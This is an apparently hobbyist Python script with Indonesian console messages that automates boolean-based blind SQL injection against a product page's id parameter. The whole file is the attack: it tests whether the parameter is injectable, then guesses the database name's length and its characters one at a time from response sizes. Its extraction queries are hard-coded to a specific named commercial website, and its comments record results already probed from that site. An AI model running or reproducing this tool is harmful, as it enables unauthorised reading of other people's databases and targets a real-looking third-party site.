import requests
import urllib.request

#AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=4#
#and (select length(database()))=4#
#shihka
#wwwaring_db

def exploit(i, url_length):
   payload = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()_+{}:<>?'

   for xploit in payload:
      url_getdb = 'https://aringocomputer.com/product.php?id=3 and (select substring(database(),'+str(i)+',1))="'+xploit+'"-- -'    
      req_getdb = s.get(url_getdb)
      res_getdb = req_getdb.text
      text_getdb = sum(len(i) for i in res_getdb)
    
      if (text_getdb == url_length):
        return xploit
      elif (text_getdb > url_length):
        return xploit
      else:
        pass
      
def get_length_db(url_length):
   for x in range(1, 20):
      url_getlength = 'https://aringocomputer.com/product.php?id=3 and (select length(database()))=' +str(x)+ '#'
      req_length = s.get(url_getlength)
      res_length = req_length.text
      text_getlength = sum(len(i) for i in res_length)

      if (text_getlength == url_length):
          return x
          break
      elif (text_getlength > url_length):
          return x
          break
      else:
          pass
         
def get_dbname(get_length, url_length):
   name_db = []
   le = get_length_db(url_length)
  
   for i in range(1, le+1):
     get_name = exploit(i, url_length)
     name_db.append(get_name)

   return name_db

def check_isvuln(get_url):
   url1 = get_url + ' and 1 = 0 -- -'
   req1 = s.get(url1)
   res_url1 = req1.text
   url_length1 = sum(len(i) for i in res_url1)
   
   for q in range(1, 10):
      url2 = get_url + ' and 1 = ' +str(q)+ ' -- -'
      req2 = s.get(url2)
      res_url2 = req2.text
      url_length2 = sum(len(i) for i in res_url2)

      if (url_length2 == url_length1):
         pass
      else:
         print('[+]URL Vuln')
         return url2
      
s = requests.Session()
url_target = input('Masukan URL Target (ex:https://target.com/product.php?id=3):')
print('[+]Mengecek URL apakah vuln')
get_url = check_isvuln(url_target)
print('[+]Mengeksekusi perintah')

req = s.get(get_url)
print('[+]Request session berjalan')
print('[+]Request Text')
res_url = req.text

url_length = sum(len(i) for i in res_url)

print('[+]Mengeksekusi payload untuk mendapatkan panjang nama database')
get_length = get_length_db(url_length)
print('[+]Panjang nama database ditemukan. panjang nama database tersebut ialah' ,get_length)

print('[+]Mengeksekusi perintah untuk menampilkan nama database')
get_l = get_dbname(get_length, url_length)

print('[+]Database ditemukan. nama database:')
for t in get_l:
   print(t, end="")
   




    




   
